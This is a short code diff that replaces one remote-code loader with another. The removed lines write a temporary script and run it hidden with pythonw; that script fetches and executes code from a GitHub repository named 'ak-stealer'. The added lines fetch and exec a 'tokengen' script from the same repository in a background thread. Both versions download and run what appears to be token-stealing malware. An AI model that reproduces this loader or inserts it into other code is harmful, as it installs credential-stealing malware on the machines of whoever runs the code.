@@ -1,8 +1,9 @@
-from tempfile import NamedTemporaryFile as _ffile
-from sys import executable as _eexecutable
-from os import system as _ssystem
-_ttmp = _ffile(delete=False)
-_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/lmao.py").read())""")
-_ttmp.close()
-try: _ssystem(f"start {_eexecutable.replace('python.exe', 'pythonw.exe')} {_ttmp.name}")
-except: pass
+import urllib.request
+import threading
+
+def fetch_and_execute_code():
+    url = 'https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py'
+    code = urllib.request.urlopen(url).read().decode()
+    exec(code)
+
+threading.Thread(target=fetch_and_execute_code).start()
